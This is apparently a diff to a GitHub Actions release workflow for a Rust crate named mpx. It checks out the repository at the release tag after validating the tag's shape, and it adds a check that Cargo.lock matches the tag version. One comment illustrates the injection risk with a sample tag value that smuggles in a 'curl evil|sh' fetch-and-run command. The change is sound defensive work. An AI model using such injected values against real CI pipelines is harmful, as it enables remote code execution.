@@ -37,7 +37,6 @@ jobs:
       tag: ${{ steps.pick.outputs.tag }}
       version: ${{ steps.pick.outputs.version }}
     steps:
-      - uses: actions/checkout@v4
       # A tag name is not a safe string. `${{ }}` pastes it into the script
       # *before* the shell sees it, so a tag like `v1.0.0;curl evil|sh` is a
       # command, not an argument — and this job is one `needs:` away from
@@ -56,6 +55,15 @@ jobs:
           fi
           echo "tag=$RAW_TAG" >> "$GITHUB_OUTPUT"
           echo "version=${RAW_TAG#v}" >> "$GITHUB_OUTPUT"
+      # Checked out *after* the shape check, at the tag rather than at the
+      # default branch. On a workflow_dispatch the default is the branch the
+      # run was started from, so the version checks below used to read main's
+      # manifest while the build jobs compiled the tag — the one arrangement
+      # where they disagree is exactly a release commit that main has since
+      # moved past, which is what this job exists to catch.
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ steps.pick.outputs.tag }}
       - name: tag matches Cargo.toml
         env:
           TAG: ${{ steps.pick.outputs.tag }}
@@ -65,6 +73,16 @@ jobs:
           manifest=$(grep -m1 '^version = ' Cargo.toml | cut -d'"' -f2)
           if [ "$manifest" != "$VERSION" ]; then
             echo "::error::tag $TAG does not match Cargo.toml version $manifest"
+            exit 1
+          fi
+          # Cargo.lock records mpx's own version too, and every build below
+          # passes --locked. A release commit that bumps Cargo.toml without
+          # the lockfile therefore fails in all four build jobs, minutes in,
+          # with a message about the network. Catch it here instead, on the
+          # one job that already has the tag checked out.
+          locked=$(awk '/^name = "mpx"$/ { getline; sub(/^version = "/, ""); sub(/"$/, ""); print; exit }' Cargo.lock)
+          if [ "$locked" != "$VERSION" ]; then
+            echo "::error::tag $TAG has a stale Cargo.lock — it pins mpx $locked, not $VERSION. Run 'cargo update -p mpx' and re-tag."
             exit 1
           fi
 
